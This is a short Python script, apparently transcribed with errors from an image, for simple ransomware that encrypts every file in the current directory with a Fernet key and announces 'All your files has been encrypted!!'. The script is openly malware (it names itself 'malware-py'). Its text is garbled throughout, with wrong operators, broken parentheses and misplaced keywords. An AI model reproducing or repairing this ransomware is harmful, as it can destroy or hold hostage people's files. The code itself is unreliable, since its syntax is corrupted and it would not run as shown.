 # /usr/bin/env python3

 import os
 from cryptography. fernet import Fernet

 files = []
 for file in os.listdir():

file ="malware-py" or file - "thekey.key" or file = "decrypt.py":


continue if os.path.isfile(file):
files.append(file)


 key - Fernet.generate key)
 with open("thekey. key" (*"wb") as thekey:

thekey .write(key)

 for file in files:

with open(file, "rb") as thefiles:

content = thefile.read)

content_encrypt - Fernet(key).encrypt(content)

with open(file,
"wb" ) as thefile:

the file.write(content_encrypt)

 print("All your files has been encrypted!!")




